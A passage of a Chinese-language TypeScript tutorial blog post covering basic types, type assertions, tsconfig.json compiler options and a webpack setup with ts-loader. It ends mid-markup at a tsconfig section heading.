        <content type="html"><![CDATA[<h1 id="快速入门"><a href="#快速入门" class="headerlink" title="快速入门"></a>快速入门</h1><h2 id="TS简介"><a href="#TS简介" class="headerlink" title="TS简介"></a>TS简介</h2><ul><li>以JS为基础构建的语言，TypeScript是JavaScript的超集</li><li>可以在任何支持JS的平台中执行</li><li>它对JS进行了扩展，向JS中引入了类型的概念，并添加了许多新的特性</li><li>TS不能被JS解析器直接执行，TS代码需要通过编译器编译为JS，然后再交由JS解析器执行</li><li>TS完全兼容JS，换言之，任何的JS代码都可以直接当成JS使用</li><li>相较于JS（动态类型语言，变量类型不固定）而言，TS拥有了静态类型，更加严格的语法，更强大的功能；<ul><li>TS可以在代码执行前就完成代码的检查，减小了运行时异常的出现的几率；</li><li>TS代码可以编译为任意版本的JS代码，可有效解决不同JS运行环境的兼容问题；</li><li>同样的功能，TS的代码量要大于JS，但由于TS的代码结构更加清晰，变量类型更加明确，在后期代码的维护中TS却远远胜于JS。</li></ul></li><li>TS增加：<ul><li>类型</li><li>支持ES的新特性</li><li>添加ES不具备的新特性</li><li>丰富的配置选项</li><li>强大的开发工具</li></ul></li></ul><hr><h2 id="TS开发环境搭建"><a href="#TS开发环境搭建" class="headerlink" title="TS开发环境搭建"></a>TS开发环境搭建</h2><ul><li>使用npm全局安装typescript<ul><li>进入命令行</li><li>输入：npm i -g typescript</li><li>查看版本：tsc</li></ul></li><li>使用tsc对ts文件进行编译<ul><li>进入命令行</li><li>进入ts文件所在目录</li><li>执行命令：tsc xxx.ts</li><li>执行tsc命令后产生一个同名的js文件</li></ul></li></ul><hr><h2 id="基本类型"><a href="#基本类型" class="headerlink" title="基本类型"></a>基本类型</h2><h3 id="类型声明"><a href="#类型声明" class="headerlink" title="类型声明"></a>类型声明</h3><ul><li>类型声明是TS非常重要的一个特点</li><li>通过类型声明可以指定TS中变量（参数、形参）的类型</li><li>指定类型后，当为变量赋值时，TS编译器会自动检查值是否符合类型声明，符合则赋值，否则报错</li><li>简而言之，类型声明给变量设置了类型，使得变量只能存储某种类型的值</li><li>JS中的函数是不考虑参数的类型和个数的，而TS考虑</li><li>语法：<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> 变量: 类型; <span class="comment">// 声明变量</span></span><br><span class="line"><span class="keyword">let</span> 变量: 类型 = 值; <span class="comment">// 声明完变量直接进行赋值</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params">参数: 类型, 参数: 类型</span>): 类型&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明一个变量a，同时指定它的类型为number</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">a</span>: <span class="built_in">number</span>; <span class="comment">// tsc编译后，let变为var，因为ts可以编译成任意版本的js，默认为ES3版本</span></span><br><span class="line">a = <span class="string">&#x27;hello&#x27;</span>; <span class="comment">// 此行代码会报错，tsc编译后可以生成js文件</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sum</span>(<span class="params">a: <span class="built_in">number</span>, b: <span class="built_in">number</span></span>): <span class="built_in">number</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> result = <span class="title function_">sum</span>(<span class="number">123</span>, <span class="number">456</span>);</span><br></pre></td></tr></table></figure></li></ul><h3 id="自动类型判断"><a href="#自动类型判断" class="headerlink" title="自动类型判断"></a>自动类型判断</h3><ul><li>TS拥有自动的类型判断机制</li><li>当对变量的声明和赋值是同时进行的，TS编译器会自动判断变量的类型</li><li>所以如果你的变量的声明和赋值时同时进行的，可以省略掉类型声明<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 如果变量的声明和赋值是同时进行的，TS可以自动对变量进行类型检测</span></span><br><span class="line"><span class="keyword">let</span> c = <span class="literal">false</span>;</span><br><span class="line">c = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure></li></ul><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><table><thead><tr><th align="center">类型</th><th align="center">例子</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">number</td><td align="center">1, -33, 2.5</td><td align="center">任意数字</td></tr><tr><td align="center">string</td><td align="center">‘hi’, “hi”, `hi`</td><td align="center">任意字符串</td></tr><tr><td align="center">boolean</td><td align="center">true、false</td><td align="center">布尔值true或false</td></tr><tr><td align="center">字面量</td><td align="center">其本身</td><td align="center">限制变量的值就是该字面量的值</td></tr><tr><td align="center">any</td><td align="center">*</td><td align="center">任意类型</td></tr><tr><td align="center">unknown</td><td align="center">*</td><td align="center">类型安全的any</td></tr><tr><td align="center">void</td><td align="center">空值（undefined）</td><td align="center">没有值（或undefined）</td></tr><tr><td align="center">never</td><td align="center">没有值</td><td align="center">不能是任何值</td></tr><tr><td align="center">object</td><td align="center">{name:’孙悟空’}</td><td align="center">任意的JS对象</td></tr><tr><td align="center">array</td><td align="center">[1,2,3]</td><td align="center">任意JS数组</td></tr><tr><td align="center">tuple</td><td align="center">[4,5]</td><td align="center">元组，TS新增类型，固定长度数组</td></tr><tr><td align="center">enum</td><td align="center">enum{A, B}</td><td align="center">枚举，TS中新增类型</td></tr></tbody></table><ul><li><p>字面量</p><ul><li>使用字面量去指定变量的类型，通过字面量可以确定变量的取值范围<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 直接使用字面量进行类型声明</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">a</span>: <span class="number">10</span>; <span class="comment">// a赋值10</span></span><br><span class="line">a = <span class="number">10</span>;</span><br><span class="line"><span class="comment">// a = 11 // 此行报错</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以使用 | 来连接多个类型（联合类型）</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">b</span>: <span class="string">&quot;male&quot;</span> | <span class="string">&quot;female&quot;</span>;</span><br><span class="line">b = <span class="string">&quot;male&quot;</span>;</span><br><span class="line">b = <span class="string">&quot;female&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="attr">c</span>: <span class="built_in">boolean</span> | <span class="built_in">string</span>;</span><br><span class="line">c = <span class="literal">true</span>;</span><br><span class="line">c = <span class="string">&#x27;hello&#x27;</span>;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>any 表示的是任意类型，一个变量设置类型为any后相当于对该变量关闭了TS的类型检测</p><ul><li>使用TS时，不建议使用any类型</li><li>any类型的变量可以赋值给任意类型变量，不会报错<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 声明变量如果不指定类型，则TS解析器会自动判断变量的类型为any （隐式的any）</span></span><br><span class="line"><span class="keyword">let</span> d;</span><br><span class="line"><span class="comment">// let d:any;</span></span><br><span class="line">d = <span class="number">10</span>;</span><br><span class="line">d = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">d = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>unknown 实际上就是一个类型安全的any</p><ul><li>unknown类型的变量，不能直接赋值给其他变量，否则会报错</li><li>unknown类型的变量如何赋值<ul><li>赋值前先做类型检查<ul><li>if + typeof判断类型</li></ul></li><li>类型断言（编译器不知道，开发人员知道，这是认为判断，写错类型也不报错），可以用来告诉解析器变量的实际类型<ul><li>变量 as 类型</li><li>&lt;类型&gt;变量<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// unknown 表示未知类型的值</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">e</span>: <span class="built_in">unknown</span>;</span><br><span class="line">e = <span class="number">10</span>;</span><br><span class="line">e = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="attr">s</span>:<span class="built_in">string</span>;</span><br><span class="line"><span class="comment">// s = e // 报错</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">typeof</span> e === <span class="string">&quot;string&quot;</span>)&#123;</span><br><span class="line">  s = e;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 类型断言，可以用来告诉解析器变量的实际类型</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 语法：</span></span><br><span class="line"><span class="comment">*   变量 as 类型</span></span><br><span class="line"><span class="comment">*   &lt;类型&gt;变量</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line">s = e <span class="keyword">as</span> <span class="built_in">string</span>;</span><br><span class="line">s = &lt;<span class="built_in">string</span>&gt;e;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul></li><li><p>void 用来表示空，以函数为例，就表示没有返回值的函数</p><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>): <span class="built_in">string</span> | <span class="built_in">number</span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>never 表示永远不会返回结果</p><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fn2</span>(<span class="params"></span>): <span class="built_in">never</span>&#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;报错了！&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>object（没啥用）</p><ul><li>{} 用来指定对象中可以包含哪些属性</li><li>语法：{属性名：属性值, 属性名：属性值}</li><li>语法：{属性名1：属性值1, 属性名2?：属性值2} <ul><li>在属性后边加问号❓，表示该属性是可选的</li></ul></li><li>[propName: string]: any 表示任意类型的属性<ul><li>propName 指属性名，且属性名不固定，可以用任何字符串代替，例如xxx</li><li>string 指在js中属性名是字符串</li><li>any 表示前面的属性可以是任意类型</li></ul></li><li>箭头函数设置函数结构（传参个数，和返回类型）的类型申明<ul><li>语法：（形参：类型,形参：类型,…）=&gt; 返回值类型<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">obj</span>: <span class="built_in">object</span> = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> <span class="attr">b</span>:&#123;<span class="attr">name</span>: <span class="built_in">string</span>, sex?: <span class="built_in">string</span>&#125; <span class="comment">// b是一个对象，并且对象中只有一个name属性，name属性是字符串</span></span><br><span class="line"><span class="comment">// b = &#123;&#125; // 报错，无name属性</span></span><br><span class="line"><span class="comment">// b = &#123;name: &#x27;Bob&#x27;， age: 18&#125; // 报错，多个age属性</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// [propName: string]: any 表示任意类型的属性</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">c</span>: &#123;<span class="attr">name</span>: <span class="built_in">string</span>, [<span class="attr">propName</span>: <span class="built_in">string</span>]: <span class="built_in">any</span>&#125;</span><br><span class="line">c = &#123;<span class="attr">name</span>: <span class="string">&#x27;BOb&#x27;</span>, <span class="attr">age</span>: <span class="number">18</span>, <span class="attr">gender</span>: <span class="string">&#x27;男&#x27;</span>&#125; <span class="comment">// 不报错</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="attr">d</span>: <span class="function">(<span class="params">a: <span class="built_in">number</span>, b: <span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">number</span></span><br><span class="line">d = <span class="keyword">function</span> (<span class="params">n1:<span class="built_in">number</span>, n2:<span class="built_in">number</span></span>):<span class="built_in">number</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> n1 + n2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p>array</p><ul><li>语法：<ul><li>类型[]<ul><li>string[] 表示字符串数组</li><li>number[] 表示数值数组</li></ul></li><li>Array&lt;类型&gt;<ul><li>Array<number> 表示数值数组<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">e</span>:<span class="built_in">string</span>[]</span><br><span class="line">e = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="attr">g</span>: <span class="title class_">Array</span>&lt;<span class="built_in">number</span>&gt;</span><br><span class="line">g = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul></li><li><p>tuple</p><ul><li>元组固定长度的数组</li><li>语法：[类型, 类型, …]<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">h</span>: [<span class="built_in">string</span>, <span class="built_in">number</span>]</span><br><span class="line">h = [<span class="string">&#x27;hello&#x27;</span>, <span class="number">123</span>]</span><br></pre></td></tr></table></figure></li></ul></li><li><p>enum 枚举</p><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// enum Gender&#123;</span></span><br><span class="line"><span class="comment">//     Male = 0,</span></span><br><span class="line"><span class="comment">//     Female = 1</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Gender</span>&#123;</span><br><span class="line">  <span class="title class_">Male</span>,</span><br><span class="line">  <span class="title class_">Female</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// let i: &#123;name: string, gender: 0 | 1&#125;</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">i</span>: &#123;<span class="attr">name</span>: <span class="built_in">string</span>, <span class="attr">gender</span>: <span class="title class_">Gender</span>&#125;</span><br><span class="line">i = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;Bob&#x27;</span>,</span><br><span class="line">  <span class="attr">gender</span>: <span class="title class_">Gender</span>.<span class="property">Female</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(i.<span class="property">gender</span> === <span class="title class_">Gender</span>.<span class="property">Female</span>)</span><br></pre></td></tr></table></figure></li><li><p>&amp; 表示同时</p><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">j</span>: &#123;<span class="attr">name</span>: <span class="built_in">string</span>&#125; &amp; &#123;<span class="attr">age</span>: <span class="built_in">number</span>&#125;</span><br><span class="line">j = &#123;<span class="attr">name</span>: <span class="string">&#x27;Bob&#x27;</span>, <span class="attr">age</span>: <span class="number">18</span>&#125;</span><br></pre></td></tr></table></figure></li><li><p>类型别名</p><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// let k: 1 | 2 | 3 | 4 | 5;</span></span><br><span class="line"><span class="comment">// let l: 1 | 2 | 3 | 4 | 5;</span></span><br><span class="line"><span class="keyword">type</span> myType = <span class="number">1</span> | <span class="number">2</span> | <span class="number">3</span> | <span class="number">4</span> | <span class="number">5</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="attr">k</span>: myType</span><br><span class="line"><span class="keyword">let</span> <span class="attr">l</span>: myType</span><br></pre></td></tr></table></figure></li></ul><h3 id="类型断言"><a href="#类型断言" class="headerlink" title="类型断言"></a>类型断言</h3><ul><li>有些情况下，变量的类型对于我们来说是很明确，但是TS编译器却并不清楚，此时，可以通过类型断言来告诉编译器变量的类型，断言有两种形式：<ul><li>第一种<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">someValue</span>: <span class="built_in">unknown</span> = <span class="string">&quot;this is a string&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="attr">strLength</span>: <span class="built_in">number</span> = (someValue <span class="keyword">as</span> <span class="built_in">string</span>).<span class="property">length</span>;</span><br></pre></td></tr></table></figure></li><li>第二种<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">someValue</span>: <span class="built_in">unknown</span> = <span class="string">&quot;this is a string&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="attr">strLength</span>: <span class="built_in">number</span> = (&lt;<span class="built_in">string</span>&gt;someValue).<span class="property">length</span>;</span><br></pre></td></tr></table></figure></li></ul></li></ul><hr><h2 id="编译选项"><a href="#编译选项" class="headerlink" title="编译选项"></a>编译选项</h2><h3 id="自动编译文件"><a href="#自动编译文件" class="headerlink" title="自动编译文件"></a>自动编译文件</h3><ul><li>编译文件时，使用 -w 指令后，TS编译器会自动监视文件的变化，并在文件发生变化时对文件进行重新编译</li><li>示例：<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">tsc xxx.ts <span class="literal">-w</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="自动编译整个项目"><a href="#自动编译整个项目" class="headerlink" title="自动编译整个项目"></a>自动编译整个项目</h3><h4 id="tsconfig-json"><a href="#tsconfig-json" class="headerlink" title="tsconfig.json"></a>tsconfig.json</h4><ul><li>如果直接使用tsc指令，则可以自动将当前项目下的所有ts文件编译为js文件</li><li>但是能直接使用tsc命令的前提时，要先在项目根目录下创建一个ts的配置文件 tsconfig.json</li><li>tsconfig.json 是ts编译器的配置文件，ts编译器可以根据它的信息来对代码进行编译</li><li>tsconfig.json是一个JSON文件，添加配置文件后，只需 tsc 命令即可完成对整个项目的编译<ul><li>同时也可以使用 tsc -w 自动监视整个项目</li></ul></li><li>路径：<ul><li>** 表示任意目录</li><li>* 表示任意文件 </li></ul></li></ul><h4 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h4><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;include&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;./src/**/*&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;exclude&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;./src/hello/**/*&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;compilerOptions&quot;</span>: &#123;</span><br><span class="line">     <span class="string">&quot;target&quot;</span>: <span class="string">&quot;ES6&quot;</span>,</span><br><span class="line">     <span class="string">&quot;module&quot;</span>: <span class="string">&quot;CommonJS&quot;</span>,</span><br><span class="line">     <span class="string">&quot;lib&quot;</span>: [<span class="string">&quot;ES6&quot;</span>, <span class="string">&quot;DOM&quot;</span>],</span><br><span class="line">     <span class="string">&quot;outDir&quot;</span>: <span class="string">&quot;./dist&quot;</span>,</span><br><span class="line">     <span class="string">&quot;outFile&quot;</span>: <span class="string">&quot;./dist/app.js&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="include"><a href="#include" class="headerlink" title="include"></a>include</h5><ul><li>用来指定哪些ts文件需要被编译</li><li>默认值：[“**/*“]</li><li>下述示例中，所有src目录和tests目录下的文件都会被编译<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;include&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;src/**/*&quot;</span><span class="punctuation">,</span> <span class="string">&quot;tests/**/*&quot;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure></li></ul><h5 id="exclude"><a href="#exclude" class="headerlink" title="exclude"></a>exclude</h5><ul><li>不需要被编译的文件目录</li><li>默认值：[“node_modules”, “bower_components”, “jspm_packages”]</li><li>下述示例中，src下hello目录下的文件都不会被编译<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;exclude&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;./src/hello/**/*&quot;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure></li></ul><h5 id="extends"><a href="#extends" class="headerlink" title="extends"></a>extends</h5><ul><li>定义被继承的配置文件</li><li>下述示例中，当前配置文件中会自动包含config目录下base.json中的所有配置信息<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;extends&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./configs/base&quot;</span></span><br></pre></td></tr></table></figure></li></ul><h5 id="files"><a href="#files" class="headerlink" title="files"></a>files</h5><ul><li>指定被编译文件的列表，只有需要编译的文件少时才会用到</li><li>列表中的文件都会被TS编译器所编译<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;files&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">  <span class="string">&quot;core.ts&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;sys.ts&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;types.ts&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure></li></ul><h5 id="compilerOptions-编译器选项"><a href="#compilerOptions-编译器选项" class="headerlink" title="compilerOptions 编译器选项"></a>compilerOptions 编译器选项</h5><ul><li>编译选项是配置文件中非常重要也比较复杂的配置选项</li><li>项目选项<ul><li>target<ul><li>设置ts代码编译的js目标版本</li><li>可选值：<ul><li>ES3（默认）、ES5、ES6/ES2015、ES7/ES2016、ES2017、ES2018、ES2019、ES2020、ESNext</li></ul></li><li>如下设置，我们所编写的ts代码将会被编译为ES6版本的js代码<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;compilerOptions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">   <span class="attr">&quot;target&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ES6&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li></ul></li><li>module<ul><li>设置编译后代码使用的模块化系统</li><li>可选值：<ul><li>CommonJS、UMD、AMD、System、ES6/ES2015、ES2020、ESNext、None</li></ul></li></ul></li><li>lib<ul><li>指定代码运行时(浏览器中)所包含的库（宿主环境）, 一般情况下不需要修改</li><li>可选值： <ul><li>ES5、ES6/ES2015、ES7/ES2016、ES2017、ES2018、ES2019、ES2020、ESNext、DOM、WebWorker、ScriptHost ……</li></ul></li></ul></li><li>outDir<ul><li>编译后文件的所在目录</li><li>默认情况下，编译后的js文件会和ts文件位于相同的目录，设置outDir后可以改变编译后文件的位置</li></ul></li><li>outFile<ul><li>将所有的文件编译为一个js文件，不常用</li><li>默认会将所有的编写在全局作用域中的代码合并为一个js文件，如果module制定了None、System或AMD则会将模块一起合并到文件之中, 其他模块不能合并</li></ul></li><li>allowJs<ul><li>是否对js文件编译，默认是false</li></ul></li><li>checkJs<ul><li>是否检查js代码是否符合语法规范，默认是false</li></ul></li><li>removeComments<ul><li>是否删除注释，默认值：false</li></ul></li><li>noEmit<ul><li>不对代码进行编译，默认值：false</li></ul></li><li>noEmitOnError<ul><li>当有错误时不生成编译后的文件，默认值：false</li></ul></li><li>strict<ul><li>所有严格检查的总开关，一般设置为：true</li></ul></li><li>alwaysStrict<ul><li>用来设置编译后的文件是否使用严格模式</li><li>编译后的js文件中最开始出现”user strict”，当使用模块化时不会出现，因为模块化状态已经是严格模式</li></ul></li><li>noImplicitAny<ul><li>不允许隐式的any类型</li></ul></li><li>noImplicitThis<ul><li>不允许不明确类型的this</li></ul></li><li>strictNullChecks<ul><li>严格的检查空值</li></ul></li></ul></li></ul><hr><h2 id="webpack"><a href="#webpack" class="headerlink" title="webpack"></a>webpack</h2><h3 id="初始化项目"><a href="#初始化项目" class="headerlink" title="初始化项目"></a>初始化项目</h3><ul><li>进入项目根目录，执行命令 npm init -y<ul><li>主要作用：创建package.json文件<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">npm init <span class="literal">-y</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="下载依赖"><a href="#下载依赖" class="headerlink" title="下载依赖"></a>下载依赖</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">npm i <span class="literal">-D</span> webpack webpack<span class="literal">-cli</span> webpack<span class="literal">-dev-server</span> typescript ts<span class="literal">-loader</span> clean<span class="literal">-webpack-plugin</span></span><br></pre></td></tr></table></figure><ul><li>npm i -D 表示开发中所要用的以来</li><li>共安装了7个包<ul><li>webpack<ul><li>构建工具webpack的核心代码</li></ul></li><li>webpack-cli<ul><li>webpack的命令行工具</li></ul></li><li>webpack-dev-server<ul><li>webpack的开发服务器</li></ul></li><li>typescript<ul><li>ts编译器核心代码</li></ul></li><li>ts-loader<ul><li>ts加载器，用于在webpack中编译ts文件</li></ul></li><li>html-webpack-plugin<ul><li>webpack中html插件，用来自动创建html文件</li></ul></li><li>clean-webpack-plugin<ul><li>webpack中的清除插件，每次构建都会先清除目录</li></ul></li></ul></li><li>g：全局安装</li><li>D：开发依赖，开发阶段使用的依赖，安装在package.json中的devDependencies中</li><li>S：生产环境，打包部署后还可以继续进行使用的包，安装在package.json中的Dependencies中</li><li>devDependencies：就是收集显示我们在开发环境中使用的包，在打包完会消失</li><li>dependencies：收集我们生产环境使用的包，在开发环境和生产环境都可以使用</li></ul><h3 id="webpack-config-js"><a href="#webpack-config-js" class="headerlink" title="webpack.config.js"></a>webpack.config.js</h3><ul><li>根目录下创建webpack的配置文件webpack.config.js<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引入一个包，nodejs中的一个模块，用于处理文件和目录的路径</span></span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="comment">// 引入html插件</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">HTMLWebpackPlugin</span> = <span class="built_in">require</span>(<span class="string">&quot;html-webpack-plugin&quot;</span>);</span><br><span class="line"><span class="comment">// 引入clean插件</span></span><br><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">CleanWebpackPlugin</span> &#125; = <span class="built_in">require</span>(<span class="string">&quot;clean-webpack-plugin&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// webpack中的所有的配置信息都应该写在module.exports中</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">optimization</span>:&#123;</span><br><span class="line">    <span class="attr">minimize</span>: <span class="literal">false</span> <span class="comment">// 关闭代码压缩，可选</span></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 指定入口文件</span></span><br><span class="line">  <span class="attr">entry</span>: <span class="string">&quot;./src/index.ts&quot;</span>,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 指定打包文件所在目录</span></span><br><span class="line">  <span class="attr">output</span>: &#123;</span><br><span class="line">    <span class="comment">// 指定打包文件的目录</span></span><br><span class="line">    <span class="comment">// path: &quot;./dist&quot;,</span></span><br><span class="line">    <span class="comment">// path.resolve() 相当于是在当前文件夹下拼接了一个文件路径</span></span><br><span class="line">    <span class="attr">path</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;dist&#x27;</span>), <span class="comment">// 在打包之后的文件夹上拼接了一个文件夹，在打包时，直接生成</span></span><br><span class="line">    <span class="comment">// __dirname,是一个成员，用来动态获取当前文件模块所属的绝对路径</span></span><br><span class="line">    <span class="comment">// __filename，可以动态获取当前文件夹的绝对路径（包含文件名）</span></span><br><span class="line">    <span class="comment">// 打包后文件的文件</span></span><br><span class="line">    <span class="attr">filename</span>: <span class="string">&quot;bundle.js&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 告诉webpack不使用箭头</span></span><br><span class="line">    <span class="attr">environment</span>:&#123;</span><br><span class="line">      <span class="attr">arrowFunction</span>: <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 指定webpack打包时要使用模块</span></span><br><span class="line">  <span class="attr">module</span>: &#123;</span><br><span class="line">    <span class="comment">// 指定要加载的规则</span></span><br><span class="line">    <span class="attr">rules</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// test指定的是规则生效的文件</span></span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.ts$/</span>,</span><br><span class="line">        <span class="comment">// 要使用的loader</span></span><br><span class="line">        <span class="comment">// use: &#x27;ts-loader&#x27;,</span></span><br><span class="line">        <span class="attr">use</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">              <span class="attr">loader</span>: <span class="string">&#x27;ts-loader&#x27;</span>,</span><br><span class="line">          &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="comment">// 要排除的文件</span></span><br><span class="line">        <span class="attr">exclude</span>: <span class="regexp">/node-modules/</span></span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 配置Webpack插件</span></span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">CleanWebpackPlugin</span>(),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">HTMLWebpackPlugin</span>(&#123;</span><br><span class="line">      <span class="comment">// title: &quot;这是一个自定义的title&quot;</span></span><br><span class="line">      <span class="attr">template</span>: <span class="string">&quot;./src/index.html&quot;</span> <span class="comment">//模板</span></span><br><span class="line">    &#125;),</span><br><span class="line">  ],</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 用来设置引用模块（import引入文件）</span></span><br><span class="line">  <span class="attr">resolve</span>: &#123;</span><br><span class="line">    <span class="attr">extensions</span>: [<span class="string">&#x27;.ts&#x27;</span>, <span class="string">&#x27;.js&#x27;</span>]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="tsconfig-json-1"><a href="#tsconfig-json-1" class="headerlink" 